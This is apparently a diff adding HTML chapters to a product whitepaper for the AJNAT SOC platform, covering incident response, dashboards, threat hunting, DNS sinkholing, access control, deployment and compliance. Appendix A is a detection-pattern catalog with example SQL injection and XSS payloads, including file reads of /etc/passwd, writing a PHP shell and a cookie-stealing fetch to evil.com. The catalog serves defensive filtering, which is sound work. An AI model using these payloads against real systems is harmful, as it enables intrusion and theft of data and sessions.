+      <div class="flow-step-content">
+        <h4>Recovery</h4>
+        <p>Monitored return to production: Gradual unblocking of affected systems under enhanced monitoring. AJNAT watches for signs of re-infection or attacker persistence for 72 hours post-recovery.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">6</div>
+      <div class="flow-step-content">
+        <h4>Post-Incident Review</h4>
+        <p>Platform generates automated incident report with timeline, root cause, MITRE mapping, and lessons learned. New correlation rules and SOAR playbooks are created to prevent recurrence.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="chart-row chart-row-2">
+    <div class="chart-box">
+      <div class="chart-box-title">MTTR — Mean Time to Respond (Minutes by Severity)</div>
+      <canvas id="mttrChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">Incident Resolution Method (Auto vs. Manual)</div>
+      <canvas id="resolutionChart"></canvas>
+    </div>
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 15 — SOC DASHBOARD
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 15</div>
+    <div class="chapter-title">SOC Dashboard &amp; Analyst Interface</div>
+    <div class="chapter-subtitle">Unified command center providing real-time visibility across all security domains</div>
+  </div>
+
+  <p>
+    The AJNAT SOC Dashboard is the single pane of glass for all security operations. It provides real-time visualization
+    of the security posture, active incidents, threat intelligence, network topology, and analyst workflow — all accessible
+    from a single browser-based interface with role-based access control.
+  </p>
+
+  <h2>15.1 Dashboard Modules</h2>
+  <table>
+    <thead><tr><th>Module</th><th>Key Metrics Displayed</th><th>Refresh Rate</th><th>User Role</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Executive Overview</strong></td><td>Security score, open incidents, blocked attacks (24h), compliance status</td><td>5 min</td><td>CISO, Executive</td></tr>
+      <tr><td><strong>Threat Map</strong></td><td>Real-time geographic attack origins, threat actors, blocked IPs by country</td><td>Real-time</td><td>All analysts</td></tr>
+      <tr><td><strong>Alert Queue</strong></td><td>All active alerts with severity, source, MITRE mapping, and status</td><td>Real-time</td><td>L1/L2/L3 Analysts</td></tr>
+      <tr><td><strong>IPS / WAF Console</strong></td><td>Attack blocks, traffic stats, WAF agent status, protected ports</td><td>30 sec</td><td>Network Security</td></tr>
+      <tr><td><strong>EDR Endpoint View</strong></td><td>Agent status, endpoint risk score, active alerts, process timeline</td><td>Real-time</td><td>Endpoint Security</td></tr>
+      <tr><td><strong>Incident Manager</strong></td><td>Case list, timeline, assigned analyst, evidence chain, playbook status</td><td>Real-time</td><td>Incident Responders</td></tr>
+      <tr><td><strong>Threat Intel Feed</strong></td><td>New IOCs, TI feed status, enrichment hits, STIX/TAXII status</td><td>5 min</td><td>Threat Intel Analysts</td></tr>
+      <tr><td><strong>Compliance Reports</strong></td><td>PCI-DSS, ISO 27001, NIST status, audit logs, policy compliance %</td><td>Daily</td><td>Compliance Officers</td></tr>
+    </tbody>
+  </table>
+
+  <h2>15.2 EDR Dashboard — Key Capabilities</h2>
+  <p>The EDR Dashboard within AJNAT SOC provides analysts with granular endpoint visibility:</p>
+  <ul>
+    <li><strong>File Activity Monitoring (FIM):</strong> Real-time file change events with SHA-256 hash verification and baseline comparison</li>
+    <li><strong>Process Tree Visualization:</strong> Interactive parent-child process graphs highlighting suspicious chains</li>
+    <li><strong>Network Connection Heatmap:</strong> Visual representation of all active and recent endpoint connections</li>
+    <li><strong>Registry Timeline:</strong> Chronological view of registry modifications with anomaly highlights</li>
+    <li><strong>Memory Injection Alerts:</strong> Detected process injection, DLL sideloading, and hollow process indicators</li>
+    <li><strong>Risk Score Trending:</strong> Per-endpoint risk score over time with drill-down to contributing events</li>
+  </ul>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 16 — THREAT HUNTING
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 16</div>
+    <div class="chapter-title">Threat Hunting &amp; Forensics</div>
+    <div class="chapter-subtitle">Proactive threat discovery, forensic investigation, and chain-of-custody evidence management</div>
+  </div>
+
+  <p>
+    Threat Hunting is the proactive practice of searching for threats that have successfully bypassed automated detection.
+    AJNAT provides analysts with powerful hunting tools including full log search across all time ranges,
+    IOC pivoting, timeline reconstruction, and forensic artifact collection — all from the SOC dashboard without
+    requiring additional forensic tools.
+  </p>
+
+  <h2>16.1 Hunting Query Language</h2>
+  <p>AJNAT's threat hunting interface supports an intuitive query language for searching across all indexed event data:</p>
+  <pre>// Find all outbound connections to TOR exit nodes in the last 7 days
+source:network AND destination.ip_reputation:"tor_exit" AND direction:outbound
+AND @timestamp:[now-7d TO now]
+
+// Hunt for LOLBin execution (Living off the Land)
+source:edr AND process.name:("mshta.exe" OR "wscript.exe" OR "cscript.exe")
+AND process.commandline:("http://" OR "https://")
+
+// Detect potential lateral movement
+source:authentication AND event.type:success
+AND user.last_seen_ip != user.current_ip
+AND geo.country != user.home_country</pre>
+
+  <h2>16.2 Forensic Evidence Collection</h2>
+  <table>
+    <thead><tr><th>Evidence Type</th><th>Collection Method</th><th>Retention</th><th>Chain of Custody</th></tr></thead>
+    <tbody>
+      <tr><td>Network Packet Captures (PCAP)</td><td>Automated on Critical alerts</td><td>90 days</td><td>Cryptographically signed + timestamped</td></tr>
+      <tr><td>Full System Memory Dump</td><td>On-demand via SOAR playbook</td><td>30 days</td><td>Hash verification + analyst sign-off</td></tr>
+      <tr><td>Process Execution Logs</td><td>Continuous EDR streaming</td><td>365 days</td><td>Immutable log store</td></tr>
+      <tr><td>File System Snapshots</td><td>Pre/post incident FIM snapshots</td><td>180 days</td><td>SHA-256 verified</td></tr>
+      <tr><td>Authentication Logs</td><td>Continuous SIEM ingestion</td><td>365 days</td><td>Immutable log store</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 17 — DNS SINKHOLE
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 17</div>
+    <div class="chapter-title">DNS Sinkhole &amp; Network Isolation</div>
+    <div class="chapter-subtitle">C2 domain blocking, DNS exfiltration detection, and automatic network containment</div>
+  </div>
+
+  <p>
+    The AJNAT DNS Sinkhole is a critical defense mechanism that operates at the DNS resolution layer — intercepting
+    DNS queries for known malicious domains (C2 servers, phishing sites, malware distribution networks) and
+    redirecting them to a controlled sinkhole IP. This prevents infected endpoints from communicating with
+    command-and-control infrastructure without requiring any changes to endpoint configuration.
+  </p>
+
+  <h2>17.1 DNS Sinkhole Rule Model</h2>
+  <table>
+    <thead><tr><th>Field</th><th>Description</th><th>Example</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Domain Pattern</strong></td><td>Exact domain or wildcard pattern to sinkhole</td><td>*.malware-c2.com</td></tr>
+      <tr><td><strong>Rule Type</strong></td><td>sinkhole / block / redirect</td><td>sinkhole</td></tr>
+      <tr><td><strong>Redirect IP</strong></td><td>IP to redirect matched queries to</td><td>10.0.0.100 (sinkhole server)</td></tr>
+      <tr><td><strong>Source</strong></td><td>Manual / Threat Intel auto-import / STIX feed</td><td>AlienVault OTX</td></tr>
+      <tr><td><strong>Confidence</strong></td><td>Threat intelligence confidence score</td><td>95%</td></tr>
+      <tr><td><strong>Category</strong></td><td>C2 / Phishing / Malware / Botnet</td><td>C2</td></tr>
+      <tr><td><strong>Hit Count</strong></td><td>Number of DNS queries matched</td><td>Auto-tracked</td></tr>
+    </tbody>
+  </table>
+
+  <h2>17.2 DNS Exfiltration Detection</h2>
+  <p>
+    Beyond sinkholing known malicious domains, AJNAT actively detects attempts to use DNS as a covert data exfiltration
+    channel (DNS tunneling). The detection engine analyzes query patterns for:
+  </p>
+  <ul>
+    <li>Unusually long domain labels (&gt;50 characters) containing Base64 or hex-encoded data</li>
+    <li>High query frequency to a single domain not in Alexa Top-1M</li>
+    <li>TXT record queries carrying large payloads</li>
+    <li>Known DNS tunneling tool signatures (dnscat2, iodine, dns2tcp)</li>
+    <li>Statistical entropy analysis of subdomain strings</li>
+  </ul>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 18 — RBAC & MULTI-TENANCY
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 18</div>
+    <div class="chapter-title">RBAC, Multi-Tenancy &amp; Access Control</div>
+    <div class="chapter-subtitle">Role-based access control, strict tenant isolation, and zero-trust user verification</div>
+  </div>
+
+  <p>
+    AJNAT SOC is architected as a <strong>multi-tenant platform</strong> supporting multiple organizations, departments,
+    or government agencies within a single platform instance — with absolute data isolation between tenants.
+    Each company or organization is an isolated tenant with its own data stores, dashboards, policies, and user accounts.
+    Cross-tenant data access is cryptographically prevented at the database query level.
+  </p>
+
+  <h2>18.1 RBAC Permission Matrix</h2>
+  <table>
+    <thead><tr><th>Permission</th><th>Super Admin</th><th>Company Admin</th><th>SOC Manager</th><th>L2 Analyst</th><th>L1 Analyst</th><th>Read Only</th></tr></thead>
+    <tbody>
+      <tr><td>View Alerts &amp; Events</td><td>✅ All</td><td>✅ Company</td><td>✅ Company</td><td>✅ Company</td><td>✅ Company</td><td>✅ Company</td></tr>
+      <tr><td>Create/Modify IPS Policies</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Execute SOAR Playbooks</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Block / Unblock IPs</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Isolate Endpoints</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Manage Firewall Rules</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Access Forensic Evidence</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Generate Compliance Reports</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Manage Users &amp; Roles</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Cross-Tenant Data Access</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Platform Configuration</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 19 — DEPLOYMENT ARCHITECTURE
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 19</div>
+    <div class="chapter-title">Deployment Architecture &amp; Scalability</div>
+    <div class="chapter-subtitle">Microservices architecture, HA configurations, and enterprise-scale deployment specifications</div>
+  </div>
+
+  <h2>19.1 Core Services Architecture</h2>
+  <table>
+    <thead><tr><th>Service</th><th>Technology Stack</th><th>Port</th><th>Scaling</th><th>HA</th></tr></thead>
+    <tbody>
+      <tr><td><strong>API Gateway</strong></td><td>Node.js + Express</td><td>3000</td><td>Horizontal</td><td>Active-Active</td></tr>
+      <tr><td><strong>IPS Server</strong></td><td>Node.js + Suricata/Zeek</td><td>8080</td><td>Per-network-segment</td><td>Active-Passive</td></tr>
+      <tr><td><strong>SIEM Engine</strong></td><td>Node.js + MongoDB</td><td>3001</td><td>Horizontal</td><td>Active-Active Cluster</td></tr>
+      <tr><td><strong>SOAR Engine</strong></td><td>Node.js + Event Bus</td><td>Internal</td><td>Horizontal</td><td>Active-Active</td></tr>
+      <tr><td><strong>EDR Agent</strong></td><td>Node.js (lightweight)</td><td>N/A (push)</td><td>Per endpoint</td><td>N/A (agent)</td></tr>
+      <tr><td><strong>Frontend (SOC Dashboard)</strong></td><td>React + Vite</td><td>443 (HTTPS)</td><td>CDN + Load Balancer</td><td>Active-Active</td></tr>
+      <tr><td><strong>Primary Database</strong></td><td>MongoDB (Replica Set)</td><td>27017</td><td>Replica Set x3</td><td>Automatic Failover</td></tr>
+      <tr><td><strong>Time-Series Log Store</strong></td><td>MongoDB + TTL indexes</td><td>Internal</td><td>Sharding</td><td>Replica Set x3</td></tr>
+      <tr><td><strong>Event Bus</strong></td><td>WebSocket + Internal Events</td><td>Internal</td><td>Horizontal</td><td>Active-Active</td></tr>
+    </tbody>
+  </table>
+
+  <h2>19.2 Hardware Specifications — Government Deployment</h2>
+  <table>
+    <thead><tr><th>Tier</th><th>Component</th><th>Minimum Spec</th><th>Recommended Spec</th><th>Enterprise Spec</th></tr></thead>
+    <tbody>
+      <tr><td>Compute</td><td>Application Servers</td><td>8 vCPU / 16GB RAM</td><td>16 vCPU / 32GB RAM</td><td>32 vCPU / 64GB RAM</td></tr>
+      <tr><td>Storage</td><td>Log Data Store</td><td>1TB SSD</td><td>5TB NVMe RAID</td><td>20TB+ NVMe Array</td></tr>
+      <tr><td>Network</td><td>IPS Inspection</td><td>1Gbps NIC</td><td>10Gbps NIC</td><td>25Gbps+ NIC</td></tr>
+      <tr><td>Database</td><td>MongoDB Replica Set</td><td>3-node / 16GB each</td><td>3-node / 32GB each</td><td>5-node / 64GB each</td></tr>
+      <tr><td>Load Balancer</td><td>Traffic Distribution</td><td>HAProxy</td><td>NGINX + HAProxy</td><td>Hardware LB + NGINX</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 22 — COMPLIANCE
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 22</div>
+    <div class="chapter-title">Compliance &amp; Regulatory Standards</div>
+    <div class="chapter-subtitle">AJNAT SOC compliance coverage for ISO 27001, NIST CSF, PCI-DSS, SOC 2, and GDPR</div>
+  </div>
+
+  <p>
+    Regulatory compliance is a core design requirement of AJNAT SOC, not an afterthought.
+    The platform includes built-in controls, evidence collection, and automated reporting that map to
+    major international security standards and government regulations.
+  </p>
+
+  <div class="compliance-grid">
+    <div class="compliance-card">
+      <div class="compliance-icon">🏅</div>
+      <div class="compliance-name">ISO 27001</div>
+      <div style="font-size:8.5pt; color:#64748b; margin:6px 0;">Information Security Management System — 93 controls covered</div>
+      <div class="compliance-status status-full">✅ Full Coverage</div>
+    </div>
+    <div class="compliance-card">
+      <div class="compliance-icon">🛡️</div>
+      <div class="compliance-name">NIST CSF</div>
+      <div style="font-size:8.5pt; color:#64748b; margin:6px 0;">Cybersecurity Framework — Identify, Protect, Detect, Respond, Recover</div>
+      <div class="compliance-status status-full">✅ Full Coverage</div>
+    </div>
+    <div class="compliance-card">
+      <div class="compliance-icon">💳</div>
+      <div class="compliance-name">PCI-DSS v4.0</div>
+      <div style="font-size:8.5pt; color:#64748b; margin:6px 0;">Payment Card Industry Data Security Standard — 12 requirements</div>
+      <div class="compliance-status status-full">✅ Full Coverage</div>
+    </div>
+    <div class="compliance-card">
+      <div class="compliance-icon">🔒</div>
+      <div class="compliance-name">SOC 2 Type II</div>
+      <div style="font-size:8.5pt; color:#64748b; margin:6px 0;">Security, Availability, Confidentiality, Integrity, Privacy</div>
+      <div class="compliance-status status-full">✅ Full Coverage</div>
+    </div>
+    <div class="compliance-card">
+      <div class="compliance-icon">🇪🇺</div>
+      <div class="compliance-name">GDPR</div>
+      <div style="font-size:8.5pt; color:#64748b; margin:6px 0;">Data breach notification, privacy by design, right to erasure</div>
+      <div class="compliance-status status-full">✅ Full Coverage</div>
+    </div>
+    <div class="compliance-card">
+      <div class="compliance-icon">⚖️</div>
+      <div class="compliance-name">CIS Controls v8</div>
+      <div style="font-size:8.5pt; color:#64748b; margin:6px 0;">Center for Internet Security 18 Critical Security Controls</div>
+      <div class="compliance-status status-full">✅ Full Coverage</div>
+    </div>
+  </div>
+
+  <div class="chart-row chart-row-2">
+    <div class="chart-box">
+      <div class="chart-box-title">Compliance Coverage by Standard</div>
+      <canvas id="complianceChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">Control Maturity Score by Domain</div>
+      <canvas id="maturityChart"></canvas>
+    </div>
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 23 — PERFORMANCE BENCHMARKS
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 23</div>
+    <div class="chapter-title">Performance Benchmarks &amp; SLA</div>
+    <div class="chapter-subtitle">Validated performance metrics, scalability benchmarks, and enterprise SLA commitments</div>
+  </div>
+
+  <div class="metric-grid">
+    <div class="metric-card blue">
+      <div class="metric-value">10M+</div>
+      <div class="metric-label">Events/Day</div>
+      <div class="metric-sub">Sustained throughput</div>
+    </div>
+    <div class="metric-card green">
+      <div class="metric-value">99.9%</div>
+      <div class="metric-label">Platform Uptime SLA</div>
+      <div class="metric-sub">&lt;8.7 hrs/year downtime</div>
+    </div>
+    <div class="metric-card cyan">
+      <div class="metric-value">&lt;2s</div>
+      <div class="metric-label">Detection to Alert</div>
+      <div class="metric-sub">End-to-end latency</div>
+    </div>
+    <div class="metric-card orange">
+      <div class="metric-value">&lt;5min</div>
+      <div class="metric-label">Detection to Block</div>
+      <div class="metric-sub">For Critical threats</div>
+    </div>
+  </div>
+
+  <h2>23.1 Throughput Benchmarks</h2>
+  <table>
+    <thead><tr><th>Metric</th><th>Small (50 endpoints)</th><th>Medium (500 endpoints)</th><th>Enterprise (5,000+ endpoints)</th></tr></thead>
+    <tbody>
+      <tr><td>Events Ingested/Day</td><td>500K</td><td>2M</td><td>10M+</td></tr>
+      <tr><td>IPS Packet Inspection</td><td>100 Mbps</td><td>1 Gbps</td><td>10 Gbps</td></tr>
+      <tr><td>Correlation Rules Applied</td><td>400/event</td><td>400/event</td><td>400/event</td></tr>
+      <tr><td>SOAR Playbook Execution</td><td>&lt;100ms</td><td>&lt;100ms</td><td>&lt;200ms</td></tr>
+      <tr><td>Dashboard Refresh Rate</td><td>5s</td><td>5s</td><td>10s</td></tr>
+      <tr><td>Forensic Log Search</td><td>&lt;2s</td><td>&lt;5s</td><td>&lt;10s</td></tr>
+    </tbody>
+  </table>
+
+  <h2>23.2 SLA Commitments</h2>
+  <table>
+    <thead><tr><th>Service Level</th><th>Metric</th><th>Target</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Platform Availability</strong></td><td>Monthly Uptime</td><td>99.9% (≤44 min downtime/month)</td></tr>
+      <tr><td><strong>Detection Latency</strong></td><td>Event to Alert</td><td>&lt;2 seconds (P95)</td></tr>
+      <tr><td><strong>Critical Alert Response</strong></td><td>Auto-block execution</td><td>&lt;1 second</td></tr>
+      <tr><td><strong>Support Response</strong></td><td>Critical incident</td><td>&lt;15 minutes (24/7)</td></tr>
+      <tr><td><strong>Data Recovery</strong></td><td>RTO (Recovery Time Objective)</td><td>&lt;4 hours</td></tr>
+      <tr><td><strong>Data Loss</strong></td><td>RPO (Recovery Point Objective)</td><td>&lt;15 minutes</td></tr>
+    </tbody>
+  </table>
+
+  <div class="chart-row chart-row-3">
+    <div class="chart-box">
+      <div class="chart-box-title">Daily Event Volume Trend</div>
+      <canvas id="eventTrendChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">Detection Latency Distribution</div>
+      <canvas id="latencyChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">Platform Uptime — 12 Months</div>
+      <canvas id="uptimeChart"></canvas>
+    </div>
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 25 — ROADMAP
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 25</div>
+    <div class="chapter-title">Roadmap &amp; Future Capabilities</div>
+    <div class="chapter-subtitle">AJNAT SOC Platform development roadmap — 2025 to 2027</div>
+  </div>
+
+  <table>
+    <thead><tr><th>Quarter</th><th>Capability</th><th>Category</th><th>Status</th></tr></thead>
+    <tbody>
+      <tr><td>Q1 2025</td><td>GenAI Analyst Assistant — LLM-powered alert triage and investigation guidance</td><td>AI/ML</td><td><span class="badge badge-blue">In Development</span></td></tr>
+      <tr><td>Q1 2025</td><td>Kubernetes-native deployment with Helm charts</td><td>Infrastructure</td><td><span class="badge badge-blue">In Development</span></td></tr>
+      <tr><td>Q2 2025</td><td>SOAR visual playbook builder (drag-and-drop)</td><td>SOAR</td><td><span class="badge badge-medium">Planned</span></td></tr>
+      <tr><td>Q2 2025</td><td>Advanced Threat Emulation (Purple Team) module</td><td>Threat Hunting</td><td><span class="badge badge-medium">Planned</span></td></tr>
+      <tr><td>Q3 2025</td><td>ZTNA (Zero Trust Network Access) integration</td><td>Network Security</td><td><span class="badge badge-medium">Planned</span></td></tr>
+      <tr><td>Q3 2025</td><td>OT/SCADA/ICS security monitoring support</td><td>Critical Infrastructure</td><td><span class="badge badge-medium">Planned</span></td></tr>
+      <tr><td>Q4 2025</td><td>Automated CVE detection and patch tracking</td><td>Vulnerability Mgmt</td><td><span class="badge badge-medium">Planned</span></td></tr>
+      <tr><td>Q1 2026</td><td>AI-Driven threat prediction (proactive defense)</td><td>AI/ML</td><td><span class="badge badge-low">Research</span></td></tr>
+      <tr><td>Q2 2026</td><td>Quantum-safe encryption for all stored data</td><td>Cryptography</td><td><span class="badge badge-low">Research</span></td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     APPENDIX A — ATTACK PATTERN REFERENCE
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Appendix A</div>
+    <div class="chapter-title">IPS / WAF Attack Pattern Reference Library</div>
+    <div class="chapter-subtitle">Complete regex pattern catalog for all 16+ attack types in AJNAT IPS v3.0</div>
+  </div>
+
+  <h2>SQL Injection — Pattern Library (18 Patterns)</h2>
+  <table>
+    <thead><tr><th>#</th><th>Pattern Description</th><th>Regex / Logic</th><th>Example Payload</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td>OR/AND true condition</td><td><code>('|")\\s*(OR|AND)\\s*true</code></td><td><code>' OR 'true'</code></td></tr>
+      <tr><td>2</td><td>UNION SELECT exfiltration</td><td><code>union\\s+(all\\s+)?select</code></td><td><code>1 UNION SELECT * FROM users</code></td></tr>
+      <tr><td>3</td><td>DROP TABLE destructive</td><td><code>drop\\s+table</code></td><td><code>; DROP TABLE users --</code></td></tr>
+      <tr><td>4</td><td>INSERT INTO injection</td><td><code>insert\\s+into</code></td><td><code>'; INSERT INTO admin VALUES</code></td></tr>
+      <tr><td>5</td><td>DELETE FROM destructive</td><td><code>delete\\s+from</code></td><td><code>'; DELETE FROM logs --</code></td></tr>
+      <tr><td>6</td><td>UPDATE SET injection</td><td><code>update\\s+\\w+\\s+set</code></td><td><code>'; UPDATE users SET password=</code></td></tr>
+      <tr><td>7</td><td>EXEC stored procedure</td><td><code>exec\\s*\\(</code></td><td><code>; EXEC xp_cmdshell('whoami')</code></td></tr>
+      <tr><td>8</td><td>xp_cmdshell RCE</td><td><code>xp_cmdshell</code></td><td><code>EXEC xp_cmdshell('net user')</code></td></tr>
+      <tr><td>9</td><td>SQL comment injection</td><td><code>;\\s*--</code></td><td><code>' ; -- comment bypass</code></td></tr>
+      <tr><td>10</td><td>Block comment bypass</td><td><code>/\\*.*?\\*/</code></td><td><code>UN/*bypass*/ION SE/**/LECT</code></td></tr>
+      <tr><td>11</td><td>Char encoding bypass</td><td><code>char\\s*\\(\\s*\\d</code></td><td><code>CHAR(39)+CHAR(79)+CHAR(82)</code></td></tr>
+      <tr><td>12</td><td>Hex encoding bypass</td><td><code>0x[0-9a-f]{4,}</code></td><td><code>0x414141 (hex encoded payload)</code></td></tr>
+      <tr><td>13</td><td>WAITFOR DELAY timing</td><td><code>waitfor\\s+delay</code></td><td><code>; WAITFOR DELAY '0:0:5'</code></td></tr>
+      <tr><td>14</td><td>Schema enumeration</td><td><code>select.*from.*information_schema</code></td><td><code>SELECT * FROM information_schema.tables</code></td></tr>
+      <tr><td>15</td><td>File read via SQL</td><td><code>load_file\\s*\\(</code></td><td><code>SELECT LOAD_FILE('/etc/passwd')</code></td></tr>
+      <tr><td>16</td><td>File write via SQL</td><td><code>into\\s+outfile</code></td><td><code>SELECT ... INTO OUTFILE '/tmp/shell.php'</code></td></tr>
+      <tr><td>17</td><td>Quote-semicolon-drop</td><td><code>'\\s*;\\s*drop</code></td><td><code>'; DROP DATABASE --</code></td></tr>
+      <tr><td>18</td><td>EXECUTE RCE vector</td><td><code>execute\\s*\\(</code></td><td><code>EXECUTE('xp_cmdshell("cmd")')</code></td></tr>
+    </tbody>
+  </table>
+
+  <h2>XSS — Pattern Library (15 Patterns)</h2>
+  <table>
+    <thead><tr><th>#</th><th>Pattern</th><th>Regex</th><th>Example</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td>Script tag injection</td><td><code>&lt;script[^&gt;]*&gt;</code></td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+      <tr><td>2</td><td>JavaScript protocol</td><td><code>javascript:</code></td><td><code>&lt;a href="javascript:alert(1)"&gt;</code></td></tr>
+      <tr><td>3</td><td>onerror event handler</td><td><code>onerror\\s*=</code></td><td><code>&lt;img src=x onerror=alert(1)&gt;</code></td></tr>
+      <tr><td>4</td><td>onload event handler</td><td><code>onload\\s*=</code></td><td><code>&lt;body onload=alert(1)&gt;</code></td></tr>
+      <tr><td>5</td><td>onclick injection</td><td><code>onclick\\s*=</code></td><td><code>&lt;button onclick=alert(1)&gt;</code></td></tr>
+      <tr><td>6</td><td>Generic event injection</td><td><code>on\\w+\\s*=\\s*[...]\\w</code></td><td><code>onmouseover="malcode"</code></td></tr>
+      <tr><td>7</td><td>iframe injection</td><td><code>&lt;iframe</code></td><td><code>&lt;iframe src="http://evil.com"&gt;</code></td></tr>
+      <tr><td>8</td><td>eval() execution</td><td><code>eval\\s*\\(</code></td><td><code>eval(atob('YWxlcnQ='))</code></td></tr>
+      <tr><td>9</td><td>Cookie theft</td><td><code>document\\.cookie</code></td><td><code>fetch('evil.com?c='+document.cookie)</code></td></tr>
+      <tr><td>10</td><td>document.write sink</td><td><code>document\\.write\\s*\\(</code></td><td><code>document.write('&lt;script&gt;evil&lt;/script&gt;')</code></td></tr>
+      <tr><td>11</td><td>window.location redirect</td><td><code>window\\.location</code></td><td><code>window.location='http://evil.com'</code></td></tr>
+      <tr><td>12</td><td>img onerror combo</td><td><code>&lt;img[^&gt;]+src[^&gt;]+onerror</code></td><td><code>&lt;img src=x onerror=...&gt;</code></td></tr>
+      <tr><td>13</td><td>CSS expression</td><td><code>expression\\s*\\(</code></td><td><code>div { width: expression(alert(1)) }</code></td></tr>
+      <tr><td>14</td><td>VBScript protocol</td><td><code>vbscript:</code></td><td><code>&lt;a href="vbscript:msgbox"&gt;</code></td></tr>
+      <tr><td>15</td><td>HTML entity encoding bypass</td><td><code>&amp;#x?[0-9a-f]+;</code></td><td><code>&amp;#x3C;script&amp;#x3E;</code></td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     APPENDIX C — RBAC PERMISSION MATRIX
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Appendix C</div>
+    <div class="chapter-title">RBAC Permission Matrix — Full Reference</div>
+    <div class="chapter-subtitle">Complete role-based access control permissions for all AJNAT SOC platform functions</div>
+  </div>
+
+  <table>
+    <thead><tr><th>Platform Function</th><th>Super Admin</th><th>Company Admin</th><th>SOC Mgr</th><th>L2 Analyst</th><th>L1 Analyst</th><th>Read-Only</th></tr></thead>
+    <tbody>
+      <tr><td colspan="7" style="background:#f1f5f9; font-weight:700; font-size:8.5pt; color:#334155; text-transform:uppercase; letter-spacing:1px;">SIEM Operations</td></tr>
+      <tr><td>View all events &amp; logs</td><td>✅ Global</td><td>✅ Tenant</td><td>✅ Tenant</td><td>✅ Tenant</td><td>✅ Tenant</td><td>✅ Tenant</td></tr>
+      <tr><td>Create correlation rules</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Export raw logs</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td></tr>
+      <tr><td colspan="7" style="background:#f1f5f9; font-weight:700; font-size:8.5pt; color:#334155; text-transform:uppercase; letter-spacing:1px;">IDS/IPS Management</td></tr>
+      <tr><td>View IPS events</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr>
+      <tr><td>Create/modify IPS policies</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td>Import policy presets</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td colspan="7" style="background:#f1f5f9; font-weight:700; font-size:8.5pt; color:#334155; text-transform:uppercase; letter-spacing:1px;">WAF Management</td></tr>
+      <tr><td>View WAF attacks</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr>
+      <tr><td>Add/remove WAF rules</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>❌</td><td>❌</td></tr>
+      <tr><td colspan="7" style="background:#f1f5f9; font-weight:700; font-size:8.5pt; color:#334155; text-transform:uppercase; letter-spacing:1px;">Incident Response</td></tr>
